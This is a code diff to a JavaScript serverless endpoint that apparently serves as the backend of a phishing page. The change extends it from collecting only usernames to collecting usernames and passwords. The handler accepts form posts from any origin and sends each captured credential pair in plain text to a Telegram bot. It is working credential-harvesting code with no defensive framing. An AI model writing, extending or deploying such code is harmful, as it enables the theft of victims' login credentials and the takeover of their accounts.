@@ -1,5 +1,4 @@
 export default async function handler(req, res) {
-  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   if (req.method === 'OPTIONS') return res.status(200).end();
@@ -8,9 +7,9 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { username } = req.body;
-  if (!username) {
-    return res.status(400).json({ error: 'Username required' });
+  const { username, password } = req.body;
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password required' });
   }
 
   const token = process.env.TELEGRAM_TOKEN;
@@ -20,7 +19,7 @@ export default async function handler(req, res) {
   }
 
   const time = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
-  const message = `👤 *Username Entry*\n🆔 Username: ${username}\n🕒 Time: ${time}`;
+  const message = `🔐 *Password Entry*\n👤 Username: ${username}\n🔑 Password: ${password}\n🕒 Time: ${time}`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -38,7 +37,7 @@ export default async function handler(req, res) {
 
     return res.status(200).json({
       success: true,
-      message: 'Username received'
+      message: 'Password received'
     });
   } catch (error) {
     console.error('Telegram error:', error.message);
